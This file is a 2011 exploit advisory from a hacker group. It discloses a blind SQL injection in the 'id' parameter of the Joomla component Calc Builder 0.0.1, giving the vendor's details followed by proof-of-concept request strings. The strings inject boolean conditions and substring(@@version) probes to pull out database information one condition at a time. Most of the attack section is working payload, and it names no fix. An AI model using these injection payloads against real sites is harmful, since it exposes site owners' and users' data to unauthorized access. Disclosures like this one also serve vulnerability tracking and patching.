@@ -1,0 +1,59 @@
+---------------------------------------------------------------------------------
+Joomla Component Calc Builder (id) Blind SQL Injection Vulnerability
+---------------------------------------------------------------------------------
+ 
+Author          : Chip D3 Bi0s
+Group           : LatinHackTeam
+Email & msn     : chipdebios[alt+64]gmail.com
+Date            : 19 June 2011
+Critical Lvl    : Moderate
+Impact          : Exposure of sensitive information
+Where           : From Remote
+---------------------------------------------------------------------------
+ 
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 
+Application     : Calc Builder
+version         : 0.0.1
+Developer       : Guillermo Santiago
+License         : GPLv2 or later       type  : Commercial
+Date Added      : 12 June 2011
+Price           : 9.90 €
+Demo            : http://components.moonsoft.es/democalcbuilder 
+Download        : http://components.moonsoft.es/downloadcalcbuilder
+ 
+Description     :
+ 
+CALC BUILDER allows you to create dynamic calculators.
+Define your own input user form (types, size, order,validations).
+Build results table through PHP code.
+Export result table to PDF.
+Simple and easy configuration. Three examples included.
+ 
+ 
+---------------------------------------------------------------------------
+ 
+ 
+I.Blind SQL injection (id) Poc/Exploit:
+~~~~~~~~~
+.....option=com_calcbuilder&controller=calcbuilder&format=raw&id=3 [blind]&fld_5=C
+
+example
+.....option=com_calcbuilder&controller=calcbuilder&format=raw&id=3 and+1=1&fld_5=C
+.....option=com_calcbuilder&controller=calcbuilder&format=raw&id=3 and+1=2&fld_5=C
+
+.....option=com_calcbuilder&controller=calcbuilder&format=raw&id=3 and+substring(@@version,1,1)=4&fld_5=C
+.....option=com_calcbuilder&controller=calcbuilder&format=raw&id=3 and+substring(@@version,1,1)=5&fld_5=C
+
+ 
+ 
+
+A special greeting to my good friends:
+R4y0k3nt, ecore, J3h3s, r0i & pc Marquesita :)
+ 
+ 
+ 
++++++++++++++++++++++++++++++++++++++++
+[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
